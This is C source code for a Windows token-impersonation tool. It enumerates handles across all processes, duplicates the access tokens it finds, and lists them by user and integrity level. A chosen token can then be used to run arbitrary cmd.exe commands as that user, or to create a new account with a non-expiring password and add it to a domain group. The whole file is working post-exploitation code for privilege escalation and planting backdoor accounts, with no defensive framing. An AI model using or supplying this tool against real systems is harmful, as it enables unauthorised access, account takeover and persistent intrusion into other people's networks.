#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ntdll")

#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 256
#define FULL_NAME_LENGTH 271
#define TOKEN_TYPE_LENGTH 30
#define TOKEN_IMPERSONATION_LENGTH 50
#define TOKEN_INTEGRITY_LENGTH 10
#define COMMAND_LENGTH 1000
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
#define SystemHandleInformation                 16
#define SystemHandleInformationSize             1024 * 1024 * 10

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG Inis_token_validAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG is_token_validAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct {
    HANDLE TokenHandle;
    int TokenId;
    DWORD SessionId;
    wchar_t Username[FULL_NAME_LENGTH];
    wchar_t TokenType[TOKEN_TYPE_LENGTH];
    wchar_t TokenIntegrity[TOKEN_INTEGRITY_LENGTH];
} TOKEN;

void get_token_SessionId(TOKEN* TOKEN_INFO) {
    DWORD token_info, SessionId;
    if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenSessionId, NULL, 0, &token_info)) {
        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenSessionId, &SessionId, token_info, &token_info)) {
            TOKEN_INFO->SessionId = SessionId;
        }
    }
}

void get_token_user_info(TOKEN* TOKEN_INFO) {
    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
    SID_NAME_USE sid;
    if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenUser, NULL, 0, &token_info)) {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
            wcscpy_s(TOKEN_INFO->Username, FULL_NAME_LENGTH, full_name);
        }
    }
}


void get_token_information(TOKEN* TOKEN_INFO) {
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
                DWORD cbSize;
                if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenIntegrityLevel, NULL, 0, &cbSize)) {
                    PTOKEN_MANDATORY_LABEL TokenStatisticsInformation = (PTOKEN_MANDATORY_LABEL)GlobalAlloc(GPTR, cbSize);
                    if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenIntegrityLevel, TokenStatisticsInformation, cbSize, &cbSize)) {
                        DWORD dwIntegrityLevel = *GetSidSubAuthority(TokenStatisticsInformation->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(TokenStatisticsInformation->Label.Sid) - 1));
                        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
                            wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");
                        }
                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                            wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");
                        }
                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                            wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");
                        }
                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
                            wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");
                        }
                    }
                }
            }
        }
    }
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass) {
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hToken;
    DWORD cbSize;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
    DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    TOKEN_PRIVILEGES tp;
    LUID luidSeAssignPrimaryTokenPrivilege;
    if (LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luidSeAssignPrimaryTokenPrivilege) == 0) {
        printf("\t[!] SeAssignPrimaryToken not owned!\n");
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeAssignPrimaryTokenPrivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
        printf("\t[!] SeAssignPrimaryToken adjust token failed: %d\n", GetLastError());
    }

    LUID luidSeDebugPrivivilege;
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivivilege) == 0) {
        printf("\t[!] SeDebugPrivilege not owned!\n");
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeDebugPrivivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
        printf("\t[!] SeDebugPrivilege adjust token failed: %d\n", GetLastError());
    }

    CloseHandle(hProcess);
    CloseHandle(hToken);

    DWORD current_SessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &current_SessionId);

    ULONG returnLenght = 0;
    TOKEN found_tokens[300];
    int nbrsfoundtokens = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE) {
            CloseHandle(process);
            continue;
        }

        HANDLE dupHandle;
        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            continue;
        }

        POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8192);
        if (wcscmp(GetObjectInfo(dupHandle, ObjectTypeInformation), L"Token")) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        TOKEN TOKEN_INFO;
        TOKEN_INFO.TokenHandle = dupHandle;
        get_token_user_info(&TOKEN_INFO);
        get_token_information(&TOKEN_INFO);
        get_token_SessionId(&TOKEN_INFO);

        int is_new_token = 0;
        for (int j = 0; j <= nbrsfoundtokens; j++) {
            if (wcscmp(found_tokens[j].Username, TOKEN_INFO.Username) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO.TokenType) == 0 && wcscmp(found_tokens[j].TokenIntegrity, TOKEN_INFO.TokenIntegrity) == 0) {
                is_new_token = 1;
            }
        }

        if (is_new_token == 0) {
            TOKEN_INFO.TokenId = nbrsfoundtokens;
            found_tokens[nbrsfoundtokens] = TOKEN_INFO;
            nbrsfoundtokens += 1;
        }
        CloseHandle(process);
    }

    if (wcscmp(argv[1], L"list") == 0) {
        for (int k = 0; k < nbrsfoundtokens; k++) {
            printf("%d %ws %ws\n", found_tokens[k].TokenId, found_tokens[k].TokenIntegrity, found_tokens[k].Username);
        }
    }

    else if ((wcscmp(argv[1], L"adduser") == 0 && argc == 7) || (wcscmp(argv[1], L"exec") == 0 && argc == 4)) {
        int selected_token = _wtoi(argv[2]);
        for (int k = 0; k < nbrsfoundtokens; k++) {
            if (found_tokens[k].TokenId == selected_token) {
                HANDLE duplicated_token;
                if (DuplicateTokenEx(found_tokens[k].TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0) {
                    if (wcscmp(argv[1], L"adduser") == 0) {

                        if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
                            printf("[!] Impersonation failed error: %d", GetLastError());
                            return 1;
                        }

                        wchar_t* group = argv[5];
                        wchar_t* server = argv[6];
                        USER_INFO_1 ui;
                        LOCALGROUP_MEMBERS_INFO_3 account;
                        memset(&ui, 0, sizeof(ui));
                        memset(&account, 0, sizeof(account));
                        ui.usri1_name = argv[3];
                        ui.usri1_password = argv[4];
                        ui.usri1_priv = USER_PRIV_USER;
                        ui.usri1_home_dir = NULL;
                        ui.usri1_comment = NULL;
                        ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
                        ui.usri1_script_path = NULL;

                        if (NetUserAdd(server, 1, (LPBYTE)&ui, NULL) != NERR_Success) {
                            printf("[!] Add user failed with error: %d\n", GetLastError());
                            return 1;
                        }

                        if (NetGroupAddUser(server, group, ui.usri1_name) != 0) {
                            printf("[!] Add user in domain %ws failed with error: %d", server, GetLastError());
                            return 1;
                        }
                        RevertToSelf();
                    }

                    if (wcscmp(argv[1], L"exec") == 0) {
                        STARTUPINFO si = {};
                        PROCESS_INFORMATION pi = {};
                        wchar_t command[COMMAND_LENGTH];
                        _snwprintf_s(command, COMMAND_LENGTH, L"cmd.exe /c %ws", argv[3]);
                        if (current_process_integrity >= SECURITY_MANDATORY_SYSTEM_RID) {
                            if (!SetTokenInformation(duplicated_token, TokenSessionId, &current_SessionId, sizeof(DWORD))) {
                                printf("[!] Couldn't change token session id (error: %d)\n", GetLastError());
                            }
                            CreateProcessAsUserW(duplicated_token, NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
                            Sleep(2000);
                        }

                        if (current_process_integrity >= SECURITY_MANDATORY_HIGH_RID && current_process_integrity < SECURITY_MANDATORY_SYSTEM_RID) {
                            CreateProcessWithTokenW(duplicated_token, 0, NULL, command, 0, 0, 0, &si, &pi);
                        }
                    }
                    CloseHandle(duplicated_token);
                }
                else {
                    printf("[!] Duplication failed with error: %d\n", GetLastError());
                    return 1;
                }
            }
        }
    }
    return 0;
}
